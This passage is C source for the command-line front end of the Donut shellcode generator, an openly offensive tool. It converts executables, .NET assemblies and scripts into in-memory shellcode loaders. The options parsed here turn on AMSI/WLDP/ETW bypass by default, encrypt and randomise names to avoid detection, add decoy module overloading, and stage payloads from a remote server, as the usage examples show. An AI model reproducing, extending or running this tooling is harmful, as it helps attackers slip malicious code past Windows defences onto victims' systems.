    // validate
    switch(arg->u32) {
      case DONUT_ARCH_X86:
      case DONUT_ARCH_X64:
      case DONUT_ARCH_X84:
        break;
      default: {
        printf("WARNING: Invalid architecture specified: %"PRId32" -- setting to x86+amd64\n", arg->u32);
        arg->u32 = DONUT_ARCH_X84;
      }          
    }
    return 1;
}

static int validate_exit(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    if(strlen(str) == 1 && isdigit((int)*str)) {
      arg->u32 = atoi(str);
    } else {
      if(!strcasecmp("thread", str)) {
        arg->u32 = DONUT_OPT_EXIT_THREAD;
      } else
      if(!strcasecmp("process", str)) {
        arg->u32 = DONUT_OPT_EXIT_PROCESS;
      }
    }
    
    switch(arg->u32) {
      case DONUT_OPT_EXIT_THREAD:
      case DONUT_OPT_EXIT_PROCESS:
        break;
      default: {
        printf("WARNING: Invalid exit option specified: %"PRId32" -- setting to thread\n", arg->u32);
        arg->u32 = DONUT_OPT_EXIT_THREAD;
      }
    }
    return 1;
}
 
static int validate_entropy(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) {
      DPRINT("NULL argument.");
      return 0;
    }
    if(strlen(str) == 1 && isdigit((int)*str)) {
      DPRINT("Converting %s to number.", str);
      arg->u32 = strtoul(str, NULL, 10);
    } else {
      if(!strcasecmp("none", str)) {
        arg->u32 = DONUT_ENTROPY_NONE;
      } else
      if(!strcasecmp("low", str)) {
        arg->u32 = DONUT_ENTROPY_RANDOM;
      } else
      if(!strcasecmp("full", str)) {
        arg->u32 = DONUT_ENTROPY_DEFAULT;
      }
    }
    
    // validate
    switch(arg->u32) {
      case DONUT_ENTROPY_NONE:
      case DONUT_ENTROPY_RANDOM:
      case DONUT_ENTROPY_DEFAULT:
        break;
      default: {
        printf("WARNING: Invalid entropy option specified: %"PRId32" -- setting to default\n", arg->u32);
        arg->u32 = DONUT_ENTROPY_DEFAULT;
      }
    }
    return 1;
}

// callback to validate format
static int validate_format(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // if it's a single digit, return it as binary
    if(strlen(str) == 1 && isdigit((int)*str)) {
      arg->u32 = atoi(str);
    } else {
      // otherwise, try map it to digit
      if(!strcasecmp("bin", str)) {
        arg->u32 = DONUT_FORMAT_BINARY;
      } else
      if(!strcasecmp("base64", str)) {
        arg->u32 = DONUT_FORMAT_BASE64;
      } else
      if(!strcasecmp("c", str)) {
        arg->u32 = DONUT_FORMAT_C;
      } else 
      if(!strcasecmp("rb", str) || !strcasecmp("ruby", str)) {
        arg->u32 = DONUT_FORMAT_RUBY;
      } else
      if(!strcasecmp("py", str) || !strcasecmp("python", str)) {
        arg->u32 = DONUT_FORMAT_PYTHON;
      } else
      if(!strcasecmp("ps", str) || !strcasecmp("powershell", str)) {
        arg->u32 = DONUT_FORMAT_POWERSHELL;
      } else
      if(!strcasecmp("cs", str) || !strcasecmp("csharp", str)) {
        arg->u32 = DONUT_FORMAT_CSHARP;
      } else
      if(!strcasecmp("hex", str)) {
        arg->u32 = DONUT_FORMAT_HEX;
      }
    }
    // validate
    switch(arg->u32) {
      case DONUT_FORMAT_BINARY:
      case DONUT_FORMAT_BASE64:
      case DONUT_FORMAT_C:
      case DONUT_FORMAT_RUBY:
      case DONUT_FORMAT_PYTHON:
      case DONUT_FORMAT_POWERSHELL:
      case DONUT_FORMAT_CSHARP:
      case DONUT_FORMAT_HEX:
        break;
      default: {
        printf("WARNING: Invalid format specified: %"PRId32" -- setting to binary.\n", arg->u32);
        arg->u32 = DONUT_FORMAT_BINARY;
      }
    }
    return 1;
}

// --bypass=w
//
// 
// a = amsi
// e = etw
// w = wldp
//
// --bypass=w
static int validate_bypass(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // just temporary
    arg->u32 = atoi(str);
    
    return 1;
}

// calback to validate headers options
static int validate_headers(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // just temporary
    arg->u32 = atoi(str);
    
    return 1;
}

static void usage (void) {
    printf(" usage: donut [options] <EXE/DLL/VBS/JS>\n\n");
    printf("       Only the finest artisanal donuts are made of shells.\n\n");   
    printf("                   -MODULE OPTIONS-\n\n");
    printf("       -n,--modname: <name>                    Module name for HTTP staging. If entropy is enabled, this is generated randomly.\n");
    printf("       -s,--server: <server>                   Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/\n");
    printf("       -e,--entropy: <level>                   Entropy. 1=None, 2=Use random names, 3=Random names + symmetric encryption (default)\n\n");
    
    printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
    printf("       -a,--arch: <arch>,--cpu: <arch>         Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).\n");
    printf("       -o,--output: <path>                     Output file to save loader. Default is \"loader.bin\"\n");
    printf("       -f,--format: <format>                   Output format. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=Powershell, 7=C#, 8=Hex\n");
    printf("       -y,--fork: <addr>                       Create thread for loader and continue execution at <addr> supplied.\n");
    printf("       -x,--exit: <action>                     Exit behaviour. 1=Exit thread (default), 2=Exit process\n\n");
    
    printf("                   -FILE OPTIONS-\n\n");
    printf("       -c,--class: <namespace.class>           Optional class name. (required for .NET DLL)\n");
    printf("       -d,--domain: <name>                     AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.\n");
    printf("       -i,--input: <path>,--file: <path>       Input file to execute in-memory.\n");
    printf("       -m,--method: <method>,--function: <api> Optional method or function for DLL. (a method is required for .NET DLL)\n");
    printf("       -p,--args: <arguments>                  Optional parameters/command line inside quotations for DLL method/function or EXE.\n");
    printf("       -w,--unicode                            Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)\n");
    printf("       -r,--runtime: <version>                 CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
    printf("       -t,--thread                             Execute the entrypoint of an unmanaged EXE as a thread.\n\n");
    
    printf("                   -EXTRA-\n\n"); 
#ifdef WINDOWS
    printf("       -z,--compress: <engine>                 Pack/Compress file. 1=None, 2=aPLib, 3=LZNT1, 4=Xpress.\n");
#else
    printf("       -z,--compress: <engine>                 Pack/Compress file. 1=None, 2=aPLib\n");
#endif
    printf("       -b,--bypass: <level>                    Bypass AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail.(default)\n\n");
    printf("       -k,--headers: <level>                   Preserve PE headers. 1=Overwrite (default), 2=Keep all\n\n");
    printf("       -j,--decoy: <level>                     Optional path of decoy module for Module Overloading.\n\n");
    
    printf(" examples:\n\n");
    printf("    donut -ic2.dll\n");
    printf("    donut --arch:x86 --class:TestClass --method:RunProcess --args:notepad.exe --input:loader.dll\n");
    printf("    donut -iloader.dll -c TestClass -m RunProcess -p\"calc notepad\" -s http://remote_server.com/modules/\n");
    
    exit (0);
}

int main(int argc, char *argv[]) {
    DONUT_CONFIG c;
    int          err;
    char         *mod_type;
    char         *arch_str[3] = { "x86", "amd64", "x86+amd64" };
    char         *inst_type[2]= { "Embedded", "HTTP" };
    
    printf("\n");
    printf("  [ Donut shellcode generator v0.9.3 (built " __DATE__ " " __TIME__ ")\n");
    printf("  [ Copyright (c) 2019-2021 TheWover, Odzhan\n\n");
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default settings
    c.inst_type = DONUT_INSTANCE_EMBED;   // file is embedded
    c.arch      = DONUT_ARCH_X84;         // dual-mode (x86+amd64)
    c.bypass    = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP fails
    c.headers   = DONUT_HEADERS_OVERWRITE;// overwrites PE headers
    c.format    = DONUT_FORMAT_BINARY;    // default output format
    c.compress  = DONUT_COMPRESS_NONE;    // compression is disabled by default
    c.entropy   = DONUT_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
    c.exit_opt  = DONUT_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
    c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function
    
    // get options
    get_opt(argc, argv, OPT_TYPE_NONE,   NULL,       "h;?", "help",            usage);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.arch,    "a",   "arch",            validate_arch);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.bypass,  "b",   "bypass",          validate_bypass);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.headers, "k",   "headers",         validate_headers);
    get_opt(argc, argv, OPT_TYPE_STRING, c.cls,      "c",   "class",           NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.domain,   "d",   "domain",          NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.entropy, "e",   "entropy",         validate_entropy);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.format,  "f",   "format",          validate_format);
    get_opt(argc, argv, OPT_TYPE_STRING, c.input,    "i",   "input;file",      NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.method,   "m",   "method;function", NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.modname,  "n",   "modname",         NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.decoy,    "j",   "decoy",           NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.output,   "o",   "output",          NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.args,     "p",   "params;args",     NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.runtime,  "r",   "runtime",         NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.server,   "s",   "server",          NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.thread,  "t",   "thread",          NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.unicode, "w",   "unicode",         NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.exit_opt,"x",   "exit",            validate_exit);
    get_opt(argc, argv, OPT_TYPE_HEX64,  &c.oep,     "y",   "oep;fork",        NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.compress,"z",   "compress",        NULL);
    
    // no file? show usage and exit
    if(c.input[0] == 0) {
      usage();
    }
    
    // server specified?
    if(c.server[0] != 0) {
      c.inst_type = DONUT_INSTANCE_HTTP;
    }
    
    // generate loader from configuration
    err = DonutCreate(&c);

    if(err != DONUT_ERROR_OK) {
      printf("  [ Error : %s\n", DonutError(err));
      return 0;
    }
    
    switch(c.mod_type) {
      case DONUT_MODULE_DLL:
        mod_type = "DLL";
        break;
      case DONUT_MODULE_EXE:
        mod_type = "EXE";
        break;
      case DONUT_MODULE_NET_DLL:
        mod_type = ".NET DLL";
        break;
      case DONUT_MODULE_NET_EXE:
        mod_type = ".NET EXE";
        break;
      case DONUT_MODULE_VBS:
        mod_type = "VBScript";
        break;
      case DONUT_MODULE_JS:
        mod_type = "JScript";
        break;
      default:
        mod_type = "Unrecognized";
        break;
    }
    
    printf("  [ Instance type : %s\n",     inst_type[c.inst_type - 1]);
    printf("  [ Module file   : \"%s\"\n", c.input);
    printf("  [ Entropy       : %s\n", 
      c.entropy == DONUT_ENTROPY_NONE   ? "None" :
      c.entropy == DONUT_ENTROPY_RANDOM ? "Random Names" : "Random names + Encryption");      
    
    if(c.compress != DONUT_COMPRESS_NONE) {
      printf("  [ Compressed    : %s (Reduced by %"PRId32"%%)\n",
        c.compress == DONUT_COMPRESS_APLIB  ? "aPLib" :
        c.compress == DONUT_COMPRESS_LZNT1  ? "LZNT1" : "Xpress",
        file_diff(c.zlen, c.len));
    }
    
    printf("  [ File type     : %s\n",     mod_type);
    
    // if this is a .NET DLL, display the class and method
    if(c.mod_type == DONUT_MODULE_NET_DLL) {
      printf("  [ Class         : %s\n", c.cls   );
      printf("  [ Method        : %s\n", c.method);
      printf("  [ Domain        : %s\n", 
        c.domain[0] == 0 ? "Default" : c.domain);
    } else
    if(c.mod_type == DONUT_MODULE_DLL) {
      printf("  [ Function      : %s\n", 
        c.method[0] != 0 ? c.method : "DllMain");
    }

    // if parameters supplied, display them
    if(c.args[0] != 0) {
      printf("  [ Parameters    : %s\n", c.args);
    }
    printf("  [ Target CPU    : %s\n", arch_str[c.arch - 1]);
    
    if(c.inst_type == DONUT_INSTANCE_HTTP) {
      printf("  [ Module name   : %s\n", c.modname);
      printf("  [ Upload to     : %s\n", c.server);
    }
    
    printf("  [ AMSI/WDLP     : %s\n",
      c.bypass == DONUT_BYPASS_NONE  ? "none" : 
      c.bypass == DONUT_BYPASS_ABORT ? "abort" : "continue");

    printf("  [ PE Headers    : %s\n",
      c.headers == DONUT_HEADERS_OVERWRITE  ? "overwrite" : 
      c.headers == DONUT_HEADERS_KEEP ? "keep" : "Undefined"); 
    
    printf("  [ Shellcode     : \"%s\"\n", c.output);
    if(c.oep != 0) {
      printf("  [ OEP           : 0x%"PRIX64"\n", c.oep);
    }

    // if decoy supplied, display the path
    if(c.decoy[0] != 0) {
      printf("  [ Decoy path    : %s\n", c.decoy);
    }
    
    printf("  [ Exit          : %s\n", 
      c.exit_opt == DONUT_OPT_EXIT_THREAD ? "Thread" : 
      c.exit_opt == DONUT_OPT_EXIT_PROCESS ? "Process" : "Undefined");
    DonutDelete(&c);
    return 0;
}
#endif

